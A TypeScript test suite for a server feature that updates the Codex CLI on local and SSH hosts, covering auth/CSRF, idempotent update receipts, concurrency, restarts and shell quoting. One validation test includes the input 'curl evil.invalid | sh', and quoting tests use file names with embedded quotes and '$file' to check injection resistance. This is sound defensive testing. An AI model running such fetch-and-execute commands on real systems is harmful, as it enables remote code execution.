import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import http from 'node:http'
import { spawnSync } from 'node:child_process'
import { PassThrough } from 'node:stream'
import { EventEmitter } from 'node:events'
import express from 'express'
import { z } from 'zod'
import { Auth } from './auth.js'
import { AutomationService } from './automations.js'
import { Bridge, type Transport } from './bridge.js'
import { HostCodexUpdates, codexUpdateScript, registerHostCodexUpdates } from './host-update.js'
import { registerHostResources } from './host-resources.js'
import { writePrivateJson } from './storage.js'
import type { Host, RpcMessage } from './types.js'
const turn = () => new Promise<void>(resolve => setImmediate(resolve))
async function until(predicate: () => boolean) {
  const deadline = Date.now() + 5000
  while (!predicate() && Date.now() < deadline) await new Promise<void>(resolve => setTimeout(resolve, 5))
  assert.ok(predicate())
}
async function fixture(options: { proxy?: boolean; installed?: string; runtimeAfter?: string; fail?: boolean; nativeBusy?: boolean; queued?: boolean; automationBusy?: boolean; changing?: boolean } = {}) {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), 'codex-host-update-'))
  const hosts: Host[] = [{ id: 'local', name: 'Local', kind: 'local' }, { id: 'remote', name: 'Remote', kind: 'ssh', hostname: 'offline.invalid' }, { id: 'offline', name: 'Offline', kind: 'local' }]
  const bridges = new Map<string, Bridge>(), peers = new Map<string, { output: PassThrough; disposed: boolean; sent: RpcMessage[] }[]>()
  const installed = new Map([['local', '0.164.0'], ['remote', '0.163.0']]); const calls: { hostId: string; phase: string }[] = []
  let hold: (() => Promise<void>) | undefined, holdPersistence: (() => Promise<void>) | undefined, persistenceCalls = 0, failure = !!options.fail, reserved = 0
  for (const host of hosts.slice(0, 2)) {
    const collection: { output: PassThrough; disposed: boolean; sent: RpcMessage[] }[] = []; peers.set(host.id, collection)
    const bridge = new Bridge(host, { mode: options.proxy ? 'proxy' : 'spawn', transportFactory: () => {
      const input = new PassThrough(), output = new PassThrough(), events = new EventEmitter(); let buffered = ''
      const peer = { output, disposed: false, sent: [] as RpcMessage[] }; collection.push(peer)
      const transport: Transport = { input, output, events, dispose: () => { peer.disposed = true; input.destroy(); output.destroy() } }
      input.on('data', chunk => {
        buffered += chunk.toString(); let index: number
        while ((index = buffered.indexOf('\n')) >= 0) {
          const message = JSON.parse(buffered.slice(0, index)) as RpcMessage; buffered = buffered.slice(index + 1); peer.sent.push(message)
          if (message.id === undefined) continue
          if (message.method === 'command/exec') continue
          const params = message.params as any
          const result = message.method === 'initialize' ? { userAgent: `codex_cli_rs/${collection.length > 1 && options.runtimeAfter ? options.runtimeAfter : installed.get(host.id)} (fixture)`, codexHome: '/fixture/home' }
            : message.method === 'thread/loaded/list' ? { data: options.nativeBusy || options.queued ? ['native-running'] : [], nextCursor: null }
            : message.method === 'thread/read' ? { thread: { id: params.threadId, status: { type: options.nativeBusy ? 'active' : 'idle' } } }
            : message.method === 'thread/resume' ? { thread: { id: params.threadId, status: { type: 'idle' } } }
            : message.method === 'thread/queue/list' ? { data: options.queued ? [{ id: 'queued' }] : [], nextCursor: null }
            : { data: [], nextCursor: null }
          queueMicrotask(() => output.write(`${JSON.stringify({ id: message.id, result })}\n`))
        }
      })
      return transport
    } }); bridges.set(host.id, bridge); await bridge.connect()
  }
  const auth = new Auth('host-update-fixture-secret', new Set(['http://localhost:8787']))
  const app = express(); app.use(express.json()); app.post('/api/auth/login', auth.login); app.use('/api', auth.requireAuth, auth.requireCsrf)
  const pausedHosts = new Set<string>()
  const maintenance = new AutomationService(directory, { getHost: id => hosts.find(host => host.id === id), getBridge: async id => bridges.get(id)! })
  await maintenance.initialize(false)
  const dependencies = { getHost: (id: string) => hosts.find(host => host.id === id), getExistingBridge: (id: string) => bridges.get(id), isHostChanging: () => !!options.changing,
    withRuntimeMaintenance: async <T>(id: string, work: () => Promise<T>) => { if (options.automationBusy) throw Object.assign(new Error('自动化正在运行'), { status: 409 }); reserved++; return maintenance.withHostRuntimeMaintenance(id, work) },
    execute: async (host: Host, phase: 'version' | 'update') => {
      calls.push({ hostId: host.id, phase });
      if (phase === 'update') { if (hold) await hold(); if (failure) throw new Error('更新失败，原有连接未重启。'); installed.set(host.id, options.installed || '0.165.0') }
      return { version: installed.get(host.id)! }
    } }
  const updates = await registerHostCodexUpdates(app, directory, dependencies)
  registerHostResources(app, { ...dependencies, dataDir: directory, pausedHosts, getBridge: async id => bridges.get(id)!,
    persistRuntime: async () => {
      persistenceCalls++
      if (holdPersistence) await holdPersistence()
      await writePrivateJson(path.join(directory, 'runtime-state.json'), { pausedHostIds: [...pausedHosts], releasedThreads: [] })
    } })
  app.use((error: any, _req: express.Request, res: express.Response, _next: express.NextFunction) => res.status(error instanceof z.ZodError ? 400 : error.status || 500).json({ error: error.message }))
  const server = http.createServer(app); await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
  const base = `http://127.0.0.1:${(server.address() as { port: number }).port}`, origin = 'http://localhost:8787'
  const response = await fetch(base + '/api/auth/login', { method: 'POST', headers: { origin, 'content-type': 'application/json' }, body: JSON.stringify({ password: 'host-update-fixture-secret' }) })
  const { csrfToken } = await response.json(), cookie = response.headers.get('set-cookie')!.split(';')[0]!
  const headers = { cookie, origin, 'content-type': 'application/json', 'x-csrf-token': csrfToken }
  const request = (hostId = 'remote', body?: unknown, custom = headers) => fetch(base + `/api/hosts/${hostId}/codex-update`, { method: body === undefined ? 'GET' : 'POST', headers: custom, ...(body !== undefined ? { body: JSON.stringify(body) } : {}) })
  const resource = (action: string, body: unknown) => fetch(`${base}/api/hosts/remote/runtime/${action}`, { method: 'POST', headers, body: JSON.stringify(body) })
  return { directory, hosts, bridges, peers, installed, calls, updates, dependencies, request, base, headers,
    resource, pausedHosts, get persistenceCalls() { return persistenceCalls },
    setHold(value: () => Promise<void>) { hold = value }, setPersistenceHold(value: () => Promise<void>) { holdPersistence = value }, setFailure(value: boolean) { failure = value }, get reserved() { return reserved },
    async close() { await updates.close(); await maintenance.close(); for (const bridge of bridges.values()) bridge.close(); await new Promise<void>(resolve => { server.close(() => resolve()); server.closeAllConnections() }); await fs.rm(directory, { recursive: true, force: true }) } }
}
const firstId = '10000000-0000-4000-8000-000000000001', secondId = '10000000-0000-4000-8000-000000000002'

test('update routes require authentication/CSRF and accept only an idempotency ID', async t => {
  const f = await fixture(); t.after(() => f.close())
  assert.equal((await fetch(f.base + '/api/hosts/remote/codex-update')).status, 401)
  assert.equal((await f.request('remote', { requestId: firstId }, { ...f.headers, 'x-csrf-token': '' })).status, 403)
  assert.equal((await f.request('missing')).status, 404)
  for (const input of [{}, { requestId: 'invalid' }, { requestId: firstId, command: 'curl evil.invalid | sh' }, { requestId: firstId, force: true }])
    assert.equal((await f.request('remote', input)).status, 400)
  assert.equal(f.calls.length, 0)
})

test('updating an idle host executes the fixed update once and restarts only that runtime to the installed version', async t => {
  const f = await fixture(); t.after(() => f.close())
  const before = f.bridges.get('remote')!.runtime.engineId
  assert.equal((await f.request('remote', { requestId: firstId })).status, 202)
  await until(() => !f.updates.isUpdating('remote'))
  const result = await (await f.request()).json()
  assert.equal(result.operation.state, 'completed'); assert.equal(result.operation.beforeVersion, '0.163.0'); assert.equal(result.operation.installedVersion, '0.165.0'); assert.equal(result.operation.runtimeVersion, '0.165.0')
  assert.equal(result.runtimeVersion, '0.165.0'); assert.equal(result.command, 'codex update')
  assert.notEqual(f.bridges.get('remote')!.runtime.engineId, before); assert.equal(f.peers.get('remote')!.length, 2); assert.equal(f.peers.get('local')!.length, 1)
  assert.deepEqual(f.calls, [{ hostId: 'remote', phase: 'version' }, { hostId: 'remote', phase: 'update' }])
  assert.equal((await fs.stat(path.join(f.directory, 'codex-updates.json'))).mode & 0o777, 0o600)
  await f.request('remote', { requestId: firstId }); assert.equal(f.calls.length, 2)
})

test('concurrent requests share a durable operation, reject competing updates and retain the old connection until installation finishes', async t => {
  const f = await fixture(); t.after(() => f.close())
  let release!: () => void; f.setHold(() => new Promise<void>(resolve => { release = resolve }))
  try {
    await f.request('remote', { requestId: firstId }); await until(() => !!release)
    assert.equal(f.updates.isUpdating('remote'), true); assert.equal(f.peers.get('remote')![0]!.disposed, false)
    const repeated = await (await f.request('remote', { requestId: firstId })).json(); assert.equal(repeated.operation.id, firstId)
    assert.equal((await f.request('remote', { requestId: secondId })).status, 409)
    await assert.rejects(f.bridges.get('remote')!.request('turn/start', { threadId: 'new', input: [] }), /重新连接|更新/)
    release(); await until(() => !f.updates.isUpdating('remote'))
    assert.equal(f.calls.filter(call => call.phase === 'update').length, 1)
  } finally { release?.() }
})

test('an installer reservation rejects host and thread release/resume without persisting pauses or disconnecting its old runtime', async t => {
  const f = await fixture(); t.after(() => f.close())
  let release!: () => void; f.setHold(() => new Promise<void>(resolve => { release = resolve }))
  try {
    await f.request('remote', { requestId: firstId }); await until(() => !!release)
    const peer = f.peers.get('remote')![0]!, nativeCalls = peer.sent.length
    for (const [action, body] of [
      ['close', { confirmed: true }], ['resume', {}], ['threads/owned/close', { confirmed: true }], ['threads/owned/resume', {}],
    ] as const) {
      const response = await f.resource(action, body)
      assert.equal(response.status, 409)
      assert.equal(f.pausedHosts.has('remote'), false)
      assert.equal(f.bridges.get('remote')!.paused, false); assert.equal(f.bridges.get('remote')!.connected, true)
      assert.equal(peer.disposed, false); assert.equal(f.persistenceCalls, 0)
      assert.equal(peer.sent.length, nativeCalls)
    }
    await assert.rejects(fs.stat(path.join(f.directory, 'runtime-state.json')), { code: 'ENOENT' })
    release(); await until(() => !f.updates.isUpdating('remote'))
    assert.equal(f.updates.status('remote').operation?.state, 'completed')
    assert.equal(f.pausedHosts.has('remote'), false); assert.equal(f.bridges.get('remote')!.paused, false)
  } finally { release?.() }
})

test('resume refused by a bridge maintenance operation does not pause that operation as error cleanup', async t => {
  const f = await fixture(); t.after(() => f.close())
  let release!: () => void, entered = false
  const gate = new Promise<void>(resolve => { release = resolve })
  const reconnecting = f.bridges.get('remote')!.reconnect(async () => { entered = true; await gate })
  try {
    await until(() => entered)
    const response = await f.resource('resume', {})
    assert.equal(response.status, 409)
    assert.equal(f.peers.get('remote')![0]!.disposed, false)
    assert.equal(f.bridges.get('remote')!.paused, false)
    assert.equal(f.persistenceCalls, 0)
  } finally { release(); await reconnecting }
})

for (const action of ['close', 'threads/owned/close'] as const)
  test(`a ${action} resource reservation prevents update dispatch while its durable state is being saved`, async t => {
    const f = await fixture(); t.after(() => f.close())
    if (action.includes('threads')) await f.bridges.get('remote')!.request('thread/resume', { threadId: 'owned' })
    let release!: () => void, persistenceStarted = false
    const gate = new Promise<void>(resolve => { release = resolve })
    f.setPersistenceHold(async () => { persistenceStarted = true; await gate })
    const closing = f.resource(action, { confirmed: true })
    try {
      await until(() => persistenceStarted)
      assert.equal(f.peers.get('remote')![0]!.disposed, false)
      const response = await f.request('remote', { requestId: firstId })
      assert.equal(response.status, action === 'close' ? 202 : 409)
      await until(() => !f.updates.isUpdating('remote'))
      if (response.status === 202) assert.equal(f.updates.status('remote').operation?.state, 'failed')
      assert.deepEqual(f.calls, [])
      release()
      assert.equal((await closing).status, 200)
      if (action === 'close') assert.deepEqual(JSON.parse(await fs.readFile(path.join(f.directory, 'runtime-state.json'), 'utf8')).pausedHostIds, ['remote'])
      else assert.equal(f.bridges.get('remote')!.releasedThreads.has('owned'), true)
    } finally { release(); await closing }
  })

for (const condition of ['active', 'approval', 'terminal', 'proxy', 'offline', 'nativeBusy', 'queued', 'automationBusy', 'changing'] as const)
  test(`an update preserves ${condition} work and never runs the installer`, async t => {
    const f = await fixture({ proxy: condition === 'proxy', nativeBusy: condition === 'nativeBusy', queued: condition === 'queued', automationBusy: condition === 'automationBusy', changing: condition === 'changing' }); t.after(() => f.close())
    const peer = f.peers.get('remote')![0]!
    if (condition === 'active') peer.output.write(JSON.stringify({ method: 'turn/started', params: { threadId: 'work', turn: { id: 'running', status: 'inProgress' } } }) + '\n')
    if (condition === 'approval') peer.output.write(JSON.stringify({ id: 'approval', method: 'item/commandExecution/requestApproval', params: { threadId: 'work', itemId: 'item' } }) + '\n')
    let command: Promise<unknown> | undefined
    if (condition === 'terminal') { command = f.bridges.get('remote')!.request('command/exec', { processId: 'shell', tty: true, command: ['bash'] }); command.catch(() => {}); await turn() }
    const response = await f.request(condition === 'offline' ? 'offline' : 'remote', { requestId: firstId })
    if (condition === 'nativeBusy' || condition === 'queued' || condition === 'automationBusy') { assert.equal(response.status, 202); await until(() => !f.updates.isUpdating('remote')); assert.equal(f.updates.status('remote').operation?.state, 'failed') }
    else assert.equal(response.status, 409)
    assert.equal(f.calls.length, 0); assert.equal(peer.disposed, false)
    if (command) { f.bridges.get('remote')!.close(); await command.catch(() => {}) }
  })

test('a failed installer keeps the old runtime and records a retryable failure without rerunning a duplicate POST', async t => {
  const f = await fixture({ fail: true }); t.after(() => f.close())
  await f.request('remote', { requestId: firstId }); await until(() => !f.updates.isUpdating('remote'))
  assert.equal(f.updates.status('remote').operation?.state, 'failed'); assert.equal(f.peers.get('remote')![0]!.disposed, false); assert.equal(f.bridges.get('remote')!.connected, true)
  await f.request('remote', { requestId: firstId }); assert.equal(f.calls.length, 2)
  f.setFailure(false); await f.request('remote', { requestId: secondId }); await until(() => !f.updates.isUpdating('remote')); assert.equal(f.updates.status('remote').operation?.state, 'completed')
})

test('an installed/runtime mismatch is reported rather than claiming a successful restart', async t => {
  const f = await fixture({ runtimeAfter: '0.164.0' }); t.after(() => f.close())
  await f.request('remote', { requestId: firstId }); await until(() => !f.updates.isUpdating('remote'))
  const operation = f.updates.status('remote').operation!
  assert.equal(operation.state, 'failed'); assert.equal(operation.installedVersion, '0.165.0'); assert.equal(operation.runtimeVersion, '0.164.0')
})

test('server restart marks an unfinished update uncertain and never automatically dispatches it again', async t => {
  const f = await fixture(); t.after(() => f.close())
  await fs.writeFile(path.join(f.directory, 'codex-updates.json'), JSON.stringify({ version: 1, operations: [{ id: firstId, hostId: 'remote', state: 'updating', startedAt: Date.now(), updatedAt: Date.now() }] }))
  const restored = new HostCodexUpdates(f.directory, f.dependencies); await restored.init()
  try {
    assert.equal(restored.status('remote').operation?.state, 'failed'); assert.match(restored.status('remote').operation?.error || '', /不会自动重发/)
    await restored.start('remote', firstId); assert.equal(f.calls.length, 0)
  } finally { await restored.close() }
})

test('journal write failure cannot execute an uncommitted updater command', async t => {
  const f = await fixture(); t.after(() => f.close())
  await fs.mkdir(path.join(f.directory, 'codex-updates.json'))
  const first = f.updates.start('remote', firstId)
  assert.equal(f.updates.status('remote').operation, null, 'GET cannot acknowledge an uncommitted receipt')
  const duplicate = f.updates.start('remote', firstId)
  const results = await Promise.allSettled([first, duplicate])
  assert.ok(results.every(result => result.status === 'rejected'), 'both duplicate submissions must observe the initial write failure')
  await turn(); assert.equal(f.calls.length, 0); assert.equal(f.updates.isUpdating('remote'), false)
})

test('an old receipt remains idempotent after newer updates instead of expiring during an offline browser retry', async t => {
  const f = await fixture(); t.after(() => f.close())
  await fs.writeFile(path.join(f.directory, 'codex-updates.json'), JSON.stringify({ version: 1, operations: [{ id: firstId, hostId: 'remote', state: 'completed', startedAt: 1, updatedAt: 2, finishedAt: 2, runtimeVersion: '0.163.0' }] }))
  const restored = new HostCodexUpdates(f.directory, f.dependencies); await restored.init(); t.after(() => restored.close())
  await restored.start('remote', secondId); await until(() => !restored.isUpdating('remote'))
  assert.equal(f.calls.length, 2)
  const retried = await restored.start('remote', firstId)
  assert.equal(retried.operation?.id, firstId); assert.equal(retried.operation?.runtimeVersion, '0.163.0')
  assert.equal(f.calls.length, 2, 'the historical update must never execute again')
})

for (const remote of [false, true]) test(`fixed updater uses the configured ${remote ? 'remote login' : 'local'} executable with safe quoting and bounded private output`, async () => {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), "codex-update-'quote-"))
  try {
    const binary = path.join(directory, "codex ' literal $file"), counter = path.join(directory, 'calls.json')
    await fs.writeFile(binary, `#!/usr/bin/env python3\nimport json,pathlib,sys\nf=pathlib.Path(${JSON.stringify(counter)})\na=json.loads(f.read_text()) if f.exists() else []\na.append(sys.argv[1:]);f.write_text(json.dumps(a))\nif sys.argv[1:]==['update']: print('private installer credential should not be exposed')\nelse: print('codex-cli 0.165.0')\n`); await fs.chmod(binary, 0o700)
    const host: Host = remote ? { id: 'remote', name: 'Fixture', kind: 'ssh', hostname: 'offline.invalid', codexPath: binary } : { id: 'local', name: 'Fixture', kind: 'local' }
    const result = spawnSync('python3', ['-'], { input: codexUpdateScript(host, { codexBin: binary }, 'update', directory), encoding: 'utf8', timeout: 15000 })
    assert.equal(result.status, 0, result.stderr); assert.deepEqual(JSON.parse(result.stdout), { ok: true, version: '0.165.0' })
    assert.deepEqual(JSON.parse(await fs.readFile(counter, 'utf8')), [['update'], ['--version']]); assert.ok(!result.stdout.includes('private installer credential'))
  } finally { await fs.rm(directory, { recursive: true, force: true }) }
})

test('remote updater restores configured cwd after login shell startup before resolving a relative CLI path', async () => {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), "codex-update-cwd-'"))
  try {
    const binary = path.join(directory, 'bin', 'codex'), shell = path.join(directory, 'login-shell')
    await fs.mkdir(path.dirname(binary))
    await fs.writeFile(binary, '#!/bin/sh\nif [ "$1" = "--version" ]; then echo "codex-cli 0.165.0"; fi\n')
    await fs.chmod(binary, 0o700)
    await fs.writeFile(shell, '#!/usr/bin/env python3\nimport os,sys\nos.chdir("/")\nos.execv("/bin/sh",["/bin/sh","-c",sys.argv[-1]])\n')
    await fs.chmod(shell, 0o700)
    const host: Host = { id: 'remote', name: 'Relative CLI fixture', kind: 'ssh', hostname: 'offline.invalid', codexPath: './bin/codex', cwd: directory }
    const result = spawnSync('python3', ['-'], { input: codexUpdateScript(host, {}, 'update'), env: { ...process.env, SHELL: shell }, encoding: 'utf8', timeout: 15000 })
    assert.equal(result.status, 0, result.stderr)
    assert.deepEqual(JSON.parse(result.stdout), { ok: true, version: '0.165.0' })
    const missing = spawnSync('python3', ['-'], { input: codexUpdateScript({ ...host, cwd: path.join(directory, 'missing') }, {}, 'update'), env: { ...process.env, SHELL: shell }, encoding: 'utf8', timeout: 15000 })
    assert.deepEqual(JSON.parse(missing.stdout), { ok: false, reason: 'directory' })
  } finally { await fs.rm(directory, { recursive: true, force: true }) }
})
